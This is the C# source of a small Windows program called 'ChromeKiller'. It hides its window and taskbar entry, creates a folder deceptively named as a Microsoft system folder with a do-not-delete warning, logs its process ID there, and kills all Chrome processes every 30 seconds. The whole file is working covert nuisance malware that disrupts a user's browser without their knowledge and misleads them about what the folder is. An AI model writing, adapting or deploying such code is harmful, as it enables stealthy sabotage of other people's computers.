using IWshRuntimeLibrary;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;

namespace ChromeKiller
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        // Get PID
        int nProcessID = Process.GetCurrentProcess().Id;
        //Create Output Dir
        string dir = @"C:\Microsoft Essentials Dont Delete Else Windows Ded";

        public MainWindow()
        {
            this.ShowInTaskbar = false;
            this.Visibility = Visibility.Hidden;
            this.WindowState = WindowState.Minimized;
            this.WindowStyle = WindowStyle.None;
            // Print PID
            //Debug.Print(nProcessID.ToString());

            // Create Dir If not already
            if (!Directory.Exists(dir))
            {
                Directory.CreateDirectory(dir);
            }
            // Start app
            InitializeComponent();

            //Output PID to txt
            using (StreamWriter writer = new StreamWriter(@"C:\Microsoft Essentials Dont Delete Else Windows Ded\PID.txt", true))
            {
                writer.WriteLine(nProcessID.ToString());
            }

            // Set time interval of killing
            var dueTime = TimeSpan.FromSeconds(30);
            var interval = TimeSpan.FromSeconds(30);

            _ = RunPeriodicAsync(OnTick, dueTime, interval, CancellationToken.None);
        }
        private static async Task RunPeriodicAsync(Action onTick,
                                                   TimeSpan dueTime,
                                                   TimeSpan interval,
                                                   CancellationToken token)
        {
            // Initial wait time before we begin the periodic loop.
            if (dueTime > TimeSpan.Zero)
                await Task.Delay(dueTime, token);

            // Repeat this loop until cancelled.
            while (!token.IsCancellationRequested)
            {
                // Call our onTick function.
                onTick?.Invoke();

                // Wait to repeat again.
                if (interval > TimeSpan.Zero)
                    await Task.Delay(interval, token);
            }
        }

        private void OnTick()
        {
            // print for conformation
            Debug.Print("LOL");
            // Get chrome PID and kill
            Process[] chromeInstances = Process.GetProcessesByName("Chrome");

            foreach (Process p in chromeInstances)
                p.Kill();
        }

    }
}
